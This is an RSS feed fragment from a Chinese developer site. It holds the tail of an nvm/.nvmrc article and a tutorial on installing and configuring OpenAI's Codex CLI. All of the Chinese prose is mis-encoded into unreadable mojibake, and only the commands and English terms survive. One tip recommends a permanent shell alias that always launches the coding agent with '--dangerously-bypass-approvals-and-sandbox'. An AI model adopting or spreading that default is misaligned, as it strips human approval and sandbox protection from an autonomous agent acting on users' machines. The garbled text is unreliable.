  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=20.10.0 &lt;21"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">æœ€ä½³å®è·µæ€»ç»“</h3>
<ol>
<li><strong>ç²¾ç¡®ç‰ˆæœ¬</strong>ï¼šä¸ºç”Ÿäº§é¡¹ç›®åœ¨Â <code>.nvmrc</code>ä¸­æŒ‡å®š<strong>ç²¾ç¡®ç‰ˆæœ¬å·</strong>ï¼ˆå¦‚Â <code>v20.10.0</code>ï¼‰ï¼Œè€Œéæ¨¡ç³Šçš„ä¸»ç‰ˆæœ¬å·ï¼Œè¿™æ˜¯æœç»æ„å¤–çš„æœ€å¯é æ–¹å¼ã€‚</li>
<li><strong>ä¸ªäººå¿…é…è‡ªåŠ¨åˆ‡æ¢</strong>ï¼šå¼ºçƒˆå»ºè®®æ¯ä½å¼€å‘è€…éƒ½é…ç½® Shell è‡ªåŠ¨åˆ‡æ¢ï¼Œè¿™å°†æå¤§æå‡å¼€å‘ä½“éªŒã€‚</li>
<li><strong>å›¢é˜Ÿå¿…æäº¤ .nvmrc</strong>ï¼šå°†Â <code>.nvmrc</code>è§†ä¸ºé¡¹ç›®å¿…éœ€å“ï¼Œå¦‚åŒÂ <code>package.json</code>ä¸€æ ·æäº¤åˆ°ä»£ç åº“ã€‚</li>
<li><strong>ç¯å¢ƒç©¿é€</strong>ï¼šåœ¨ Dockerfileã€CI é…ç½®ç­‰æ‰€æœ‰ç¯å¢ƒå®šä¹‰ä¸­ï¼Œéƒ½ä¼˜å…ˆè¯»å–Â <code>.nvmrc</code>æ¥è®¾ç½® Node ç‰ˆæœ¬ï¼Œå®ç°ä»å¼€å‘åˆ°ç”Ÿäº§çš„å…¨é“¾è·¯ä¸€è‡´ã€‚</li>
</ol>
<p>é€šè¿‡Â <code>nvm</code>å’ŒÂ <code>.nvmrc</code>è¿™å¥—ç®€å•è€Œå¼ºå¤§çš„ç»„åˆæ‹³ï¼Œä½ å¯ä»¥è½»æ¾ç®¡ç†å¤æ‚çš„ Node.js ç‰ˆæœ¬ç¯å¢ƒã€‚æ— è®ºæ˜¯ä¸ªäººé¡¹ç›®è¿˜æ˜¯å¤§å‹å›¢é˜Ÿåä½œï¼Œå®ƒéƒ½æ˜¯ä¿éšœå¼€å‘é¡ºç•…ã€å‡å°‘æ— è°“è°ƒè¯•æ—¶é—´çš„åŸºç¡€è®¾æ–½ã€‚ç°åœ¨å°±ä¸ºä½ æ‰‹å¤´çš„é¡¹ç›®åˆ›å»ºä¸€ä¸ªÂ <code>.nvmrc</code>æ–‡ä»¶å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GPT Codexæ€ä¹ˆç”¨ï¼Ÿå›½å†…å¦‚ä½•ä½¿ç”¨ï¼Ÿæœ€å…¨CLIä½¿ç”¨æ•™ç¨‹ä¸é«˜æ•ˆæŠ€å·§]]></title>    <link>https://juejin.cn/post/7603010441149743145</link>    <guid>https://juejin.cn/post/7603010441149743145</guid>    <pubDate>2026-02-05T09:56:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603010441149743145" data-draft-id="7603142147642851371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GPT Codexæ€ä¹ˆç”¨ï¼Ÿå›½å†…å¦‚ä½•ä½¿ç”¨ï¼Ÿæœ€å…¨CLIä½¿ç”¨æ•™ç¨‹ä¸é«˜æ•ˆæŠ€å·§"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-02-05T09:56:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çˆ±åƒçš„å°è‚¥ç¾Š"/> <meta itemprop="url" content="https://juejin.cn/user/2637045249608064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GPT Codexæ€ä¹ˆç”¨ï¼Ÿå›½å†…å¦‚ä½•ä½¿ç”¨ï¼Ÿæœ€å…¨CLIä½¿ç”¨æ•™ç¨‹ä¸é«˜æ•ˆæŠ€å·§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637045249608064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çˆ±åƒçš„å°è‚¥ç¾Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:56:00.000Z" title="Thu Feb 05 2026 09:56:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœä½ æ˜¯ä¸€åç¨‹åºå‘˜ï¼Œå¤§æ¦‚çŸ¥é“OpenAIçš„Codexï¼Œæœ€è¿‘å…³äºCodexå’ŒClaude codeè°æ›´å‰å®³çš„äº‰å¾—æ˜¯æ„ˆæ¼”æ„ˆçƒˆï¼Œè™½ç„¶å¤§å®¶éƒ½åœ¨è¯´Claude codeå¥½ç”¨ï¼Œä½†æ˜¯ä¸ä¹ä¸€äº›èµ„æ·±çš„ç¨‹åºå‘˜è¯´Codexå¥½ç”¨ã€‚</p>
<p>ç»™å‡ºçš„åŸå› å¾ˆç®€å•ï¼šCodexçš„bugæ›´å°‘ï¼Œä¸Šä¸‹æ–‡æ›´é•¿ï¼Œå”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯å¤ªæ…¢äº†ã€‚</p>
<p>è¿™é‡Œç´§æ€¥æ’æ’­ä¸€æ¡æ–°é—»ï¼šGPTçš„æ¨¡å‹å·²ç»æé€Ÿäº†ï¼Œæå‡äº†40%ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df734e8a6fe47a99022f310f20273b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=ExNRpdU3Scp0rb45HkFquBGFxLE%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘ï¼ŒCodexå‘å¸ƒäº†macOSåº”ç”¨ï¼Œè¿™æ„å‘³ç€å›½å†…è¶Šæ¥è¶Šå¤šçš„å¼€å‘è€…å¯ä»¥ä¾¿æ·åœ°ä½¿ç”¨å®ƒã€‚ä¸è¿‡å¾ˆå¤šäººåˆšå¼€å§‹æ¥è§¦Codexæ—¶å¾€å¾€ä¸€è„¸æ‡µå®ƒæ€ä¹ˆå®‰è£…ï¼Ÿæ€ä¹ˆç”¨ï¼Ÿä¸ºä»€ä¹ˆæœ‰è¿™ä¹ˆå¤šé…ç½®å‚æ•°ï¼Ÿ</p>
<p>æœ¬æ–‡å°±æ¥ç³»ç»Ÿè§£å†³è¿™äº›é—®é¢˜ã€‚æˆ‘ä¼šä»Codexçš„åŸºæœ¬æ¦‚å¿µè®²èµ·ï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ åœ¨æœ¬åœ°å¿«é€Ÿéƒ¨ç½²CLIç¯å¢ƒï¼Œæœ€åå†åˆ†äº«15ä¸ªæˆ‘åœ¨å®é™…å¼€å‘ä¸­æ€»ç»“çš„é«˜æ•ˆä½¿ç”¨æŠ€å·§ã€‚è¿™äº›æŠ€å·§æ¶µç›–ä»å¿«æ·æ“ä½œåˆ°é«˜çº§é…ç½®ï¼Œè¶³ä»¥è®©ä½ ä»æ–°æ‰‹å‡çº§åˆ°è¿›é˜¶ç”¨æˆ·ã€‚</p>
<p>å¦‚æœä½ è¿˜æƒ³è¦ä½¿ç”¨Claude codeï¼Œå¯ä»¥çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« ï¼Œæœ‰ä»‹ç»ä¸‰ç§æ–¹æ³•ã€‚</p>
<p>ç›¸å…³é˜…è¯»ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1992313721415046720" target="_blank" title="https://zhuanlan.zhihu.com/p/1992313721415046720" ref="nofollow noopener noreferrer">æ‰‹æŠŠæ‰‹æ•™ä½ åœ¨å›½å†…ä½¿ç”¨ Claude Codeï¼šä¸å°å·ã€ä¸æŠ˜è…¾ã€æ¯”å®˜ç½‘æ›´ä¾¿å®œ</a></p>
<hr/>
<h2 data-id="heading-0">ä¸€Codexæ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆå€¼å¾—å…³æ³¨</h2>
<p>Codexåº”è¯¥æ˜¯OpenAIä¸“ä¸ºç¼–ç¨‹æ‰“é€ çš„AIæ¨¡å‹ã€‚å’Œé€šç”¨çš„ChatGPTç›¸æ¯”ï¼Œå®ƒæœ‰å‡ ä¸ªæ˜æ˜¾ä¼˜åŠ¿ã€‚ä»£ç ç†è§£å’Œç”Ÿæˆèƒ½åŠ›è¿œè¶…é€šç”¨æ¨¡å‹ï¼Œèƒ½å‡†ç¡®æŠŠæ¡ç¼–ç¨‹é€»è¾‘ã€è¯­æ³•è§„èŒƒå’Œæœ€ä½³å®è·µã€‚</p>
<p>æ”¯æŒ40å¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒPythonã€JavaScriptã€Goéƒ½èƒ½è½»æ¾æå®šã€‚æ›´å…³é”®çš„æ˜¯ï¼Œå®ƒä¸ä»…ç”Ÿæˆä»£ç ï¼Œè¿˜èƒ½ç†è§£ä»£ç ã€è°ƒè¯•é”™è¯¯ã€é‡æ„é€»è¾‘åŸºæœ¬æ˜¯ä¸ªé«˜çº§ç¨‹åºå‘˜çš„å‡çº§ç‰ˆã€‚</p>
<p>ä½ å¯ä»¥åœ¨ç»ˆç«¯é‡Œæ•²å‘½ä»¤ï¼ˆCLIï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨VS Codeé‡Œå¼¹å‡ºAIå»ºè®®ï¼ˆIDEæ’ä»¶ï¼‰ï¼Œè¿˜å¯ä»¥é€šè¿‡SDKé›†æˆåˆ°è‡ªå·±çš„åº”ç”¨ï¼Œæˆ–è€…ç›´æ¥ä¸Šç½‘é¡µç”¨ï¼ˆäº‘ç«¯ï¼‰ã€‚æœ¬æ–‡ä¸»è¦è®²CLIæ–¹æ¡ˆï¼Œå› ä¸ºå®ƒç»™å¼€å‘è€…æœ€å¤§çš„çµæ´»æ€§ã€‚</p>
<p>è™½ç„¶è¯´å¾—å¾ˆAIæ„Ÿï¼Œä½†æ˜¯ç”¨æˆ·å”¯ä¸€è®¤å¯å®ƒçš„ï¼Œå°±æ˜¯å¥½ç”¨ã€‚</p>
<hr/>
<p>é‚£å®ƒåˆ°åº•èƒ½æ€ä¹ˆç”¨ï¼Ÿ</p>
<h2 data-id="heading-1">äºŒã€å“ªäº›ç”¨æˆ·å¯ä»¥ä½¿ç”¨Codex</h2>
<p>ç›®å‰åªæœ‰ä»˜è´¹ç”¨æˆ·æ‰èƒ½ä½¿ç”¨Codexï¼Œæ¯”å¦‚Plusã€Proã€Teamç­‰ä¼šå‘˜ï¼Œå¦‚æœä½ è¿˜ä¸ä¼šå¼€é€šä¼šå‘˜ï¼Œå¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« ã€‚</p>
<p>ç›¸å…³é˜…è¯»ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F2002399500036219170" target="_blank" title="https://zhuanlan.zhihu.com/p/2002399500036219170" ref="nofollow noopener noreferrer">ChatGPTå¦‚ä½•å……ä¼šå‘˜ï¼ŸWildAIã€Google Playã€ç¤¼å“å¡5ç§æ–¹æ³•å®æµ‹å¯¹æ¯”</a></p>
<p>é‚£å…è´¹ç”¨æˆ·å¯ä»¥ç”¨å—ï¼Ÿå…¶å®ä¹Ÿå¯ä»¥ï¼Œåªä¸è¿‡éœ€è¦æ­é…ç€OpenAIçš„APIæ‰èƒ½ç”¨ï¼Œåœ¨åé¢çš„ä½¿ç”¨æŠ€å·§é‚£é‡Œæœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥çœ‹çœ‹ã€‚</p>
<p>Codexå®‰è£…æ•™ç¨‹ï¼ŒCLIç¯å¢ƒå¿«é€Ÿä¸Šæ‰‹ï¼šä»é›¶åˆ°å¯åŠ¨</p>
<p>ç¬¬ä¸€æ­¥ï¼šå®‰è£…Node.js</p>
<p>Codex CLIåŸºäºNode.jså¼€å‘ï¼Œå› æ­¤ä½ é¦–å…ˆéœ€è¦åœ¨æœ¬åœ°å®‰è£…å®ƒã€‚è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F" target="_blank" title="https://nodejs.org/" ref="nofollow noopener noreferrer">Node.jså®˜ç½‘</a>ï¼ŒæŒ‰ç…§ä½ çš„ç³»ç»Ÿç‰ˆæœ¬ï¼ˆWindows/Mac/Linuxï¼‰ä¸‹è½½åˆé€‚çš„å®‰è£…ç¨‹åºã€‚ç”±äºæ¶‰åŠå‘½ä»¤è¡Œå·¥å…·é“¾ï¼Œå»ºè®®ä¸‹è½½LTSé•¿æœŸæ”¯æŒç‰ˆæœ¬ï¼Œç¨³å®šæ€§æ›´å¥½ã€‚</p>
<p>å®‰è£…å®Œæˆåï¼Œæ‰“å¼€ç»ˆç«¯éªŒè¯ä¸€ä¸‹ï¼š</p>
<p>node -v npm -v<br/>
èƒ½çœ‹åˆ°ç‰ˆæœ¬å·å°±è¯´æ˜å®‰è£…æˆåŠŸäº†ã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼šå®‰è£…Codex CLI</p>
<p>ç°åœ¨ç”¨npmå…¨å±€å®‰è£…Codexï¼šnpm i -g @openai/codex</p>
<p>å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0525070b4024f2caf30dc51dad6eb2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=B4iIIFCSTCRkc%2BDgOf01Y%2F637Y0%3D" alt="" loading="lazy"/></p>
<p>è¿™æ¡å‘½ä»¤ä¼šä»npmä»“åº“ä¸‹è½½CodexåŒ…å¹¶å…¨å±€å®‰è£…ï¼Œè¿™æ ·ä½ åœ¨ä»»ä½•ç›®å½•ä¸‹éƒ½èƒ½ç›´æ¥ä½¿ç”¨<code>codex</code>å‘½ä»¤ã€‚å®‰è£…å¯èƒ½éœ€è¦ä¸€ä¸¤åˆ†é’Ÿï¼Œå–å†³äºä½ çš„ç½‘ç»œã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼šç™»å½•ä¸éªŒè¯</p>
<p>å®‰è£…å¥½åï¼Œåœ¨ç»ˆç«¯è¾“å…¥ï¼šcodex</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7862f2ca484f451a8393615090ca415e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=nOan0wSq0MhvXRnv%2BF16OWistNw%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74aac8db0a6c48959c4030c4da434b9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=GbSbBcWjlNUHLCY%2BQGTIf%2FeszFY%3D" alt="" loading="lazy"/></p>
<p>è¿”å›å‘½ä»¤è¡Œçª—å£ ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ç•Œé¢</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a28b309e87c461c9f8473a6108448ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=O0ndIzrPoBJSxc1QdoWE0TQAGFA%3D" alt="" loading="lazy"/></p>
<p>ä¸€ç›´å›è½¦</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c0dd8ad8a474f32b6ad9a6e98a9cb34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=w7vUdiGKCV9feOj4uJd0epZTrn0%3D" alt="" loading="lazy"/></p>
<p>è¾“å…¥helloæµ‹è¯•ä¸€ä¸‹ï¼Œèƒ½æ­£å¸¸è¿”å›ç»“æœå³è¡¨ç¤ºèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd80348e336d4c4c8e63ce1f52537dc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=xuWMyA%2B7luTdYDWBLMNbIwtARWw%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€15ä¸ªæ ¸å¿ƒæŠ€å·§ï¼šä»åŸºç¡€åˆ°è¿›é˜¶</h2>
<p>åŸºç¡€æ“ä½œç±»</p>
<p><strong>1. è®¾ç½®åˆ«ååŠ é€Ÿå¯åŠ¨</strong></p>
<p>æ¯æ¬¡å¯åŠ¨éƒ½è¦ç­‰å¾…æ¨¡å‹åŠ è½½ï¼Œæœ‰æ²¡æœ‰åŠæ³•è®©å¸¸ç”¨é…ç½®é¢„å…ˆç”Ÿæ•ˆï¼Ÿå½“ç„¶æœ‰ã€‚ä½ å¯ä»¥ä¸ºCodexè®¾ç½®åˆ«åï¼ŒæŠŠå¸¸ç”¨å‚æ•°ç»‘å®šè¿›å»ã€‚</p>
<p>åœ¨Macä¸Šï¼Œç¼–è¾‘ä½ çš„shellé…ç½®æ–‡ä»¶ï¼š</p>
<blockquote>
<p>echo "alias codex='codex -m gpt-5-codex -c model_reasoning_effort="high" -c model_reasoning_summary_format=experimental --search --dangerously-bypass-approvals-and-sandbox'" &gt;&gt; ~/.zshrc source ~/.zshrc</p>
</blockquote>
<p>Windowsç”¨æˆ·å¯ä»¥é€šè¿‡è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡å®ç°ç±»ä¼¼æ•ˆæœã€‚è¿™æ ·ä¸‹æ¬¡åªéœ€è¾“å…¥<code>codex</code>ï¼Œæ‰€æœ‰å‚æ•°å°±è‡ªåŠ¨åŠ è½½äº†ï¼Œçœå»æ‰‹å·¥è°ƒæ•´çš„éº»çƒ¦ã€‚</p>
<p><strong>2. å¿«æ·å‘½ä»¤é€ŸæŸ¥è¡¨</strong></p>
<p>Codexå†…ç½®äº†ä¸€å¥—å¿«æ·å‘½ä»¤ç³»ç»Ÿã€‚åœ¨ä¼šè¯ä¸­è¾“å…¥<code>/</code>å°±èƒ½çœ‹åˆ°æ‰€æœ‰å¯ç”¨å‘½ä»¤ã€‚æœ€å¸¸ç”¨çš„æœ‰ä¸‰ä¸ªâ€”â€”è¾“å…¥<code>/model</code>åˆ‡æ¢æ¨¡å‹å’Œæ¨ç†ç­‰çº§ï¼Œè¾“å…¥<code>/new</code>å¼€å¯æ–°ä¼šè¯ï¼Œè¾“å…¥<code>/status</code>æŸ¥çœ‹Tokenç”¨é‡ã€‚æƒ³çœ‹æ›´å¤šï¼Ÿè¾“å…¥<code>/</code>å°±èƒ½æŠŠå…¨éƒ¨å‘½ä»¤å“å…‰ä¸€éã€‚ç†Ÿè®°è¿™å‡ ä¸ªå¸¸ç”¨çš„ï¼Œèƒ½æ¨é«˜å·¥ä½œæ•ˆç‡ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/965500e38f9244ef9f2e9fd67664c366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=kMckERvw%2BxDPwdA3nJdL3OKZWYw%3D" alt="" loading="lazy"/></p>
<p><strong>3. å¿«é€Ÿæ¢è¡Œè¾“å…¥</strong></p>
<p>ç¼–å†™å¤æ‚æç¤ºè¯æ—¶ï¼Œé•¿è¡Œä»£ç çœ‹èµ·æ¥å¾ˆå‡Œä¹±ã€‚æŒ‰<code>Option + Enter</code>ï¼ˆMacï¼‰æˆ–<code>Control + J</code>ï¼ˆWindows/Linuxï¼‰å¯ä»¥å¿«é€Ÿæ¢è¡Œï¼Œè®©è¾“å…¥æ›´æ˜“è¯»ã€‚è¿™ä¸ªçœ‹ä¼¼ä¸èµ·çœ¼çš„å¿«æ·é”®ï¼Œåœ¨å¤„ç†å¤šè¡ŒæŒ‡ä»¤æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚</p>
<p><strong>4. ä¸­æ–­ä¸é€€å‡ºæ“ä½œ</strong></p>
<p>Codexåœ¨æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œæœ‰æ—¶éœ€è¦æ‰“æ–­ã€‚æŒ‰<code>ESC</code>é”®æˆ–<code>Control + C</code>å¯ä»¥ç«‹å³ä¸­æ–­å½“å‰è¯·æ±‚ã€‚å¦‚æœæƒ³å½»åº•é€€å‡ºä¼šè¯ï¼Œå†æŒ‰ä¸€æ¬¡<code>Control + C</code>æˆ–ç›´æ¥è¾“å…¥<code>/quit</code>ã€‚è¿™äº›æ“ä½œç»™äº†ä½ å®Œæ•´çš„æ§åˆ¶æƒï¼Œé¿å…è¢«å¡ä½ã€‚</p>
<p><strong>5. é€šè¿‡APIä½¿ç”¨Codex</strong></p>
<p>å¦‚æœä½ æ²¡æœ‰ChatGPT Plusè®¢é˜…ï¼Œä¹Ÿèƒ½é€šè¿‡ä»˜è´¹APIçš„æ–¹å¼ä½¿ç”¨Codexã€‚ä¿®æ”¹é…ç½®æ–‡ä»¶<code>~/.codex/config.toml</code>ï¼Œæ·»åŠ ï¼špreferred_auth_method = "apikey"</p>
<p>ç„¶åé…ç½®ä½ çš„OpenAI API Keyã€‚è¿™ç§æ–¹å¼ç‰¹åˆ«é€‚åˆä¼ä¸šç”¨æˆ·æˆ–éœ€è¦æŒ‰éœ€è®¡è´¹çš„åœºæ™¯ã€‚</p>
<p>æ›´å¤šè´¹ç”¨æ˜ç»†æŸ¥çœ‹å®˜æ–¹è¯´æ˜ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fopenai.com%2Fapi%2Fpricing%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//openai.com/api/pricing/" ref="nofollow noopener noreferrer">openai.com/api/pricingâ€¦</a></p>
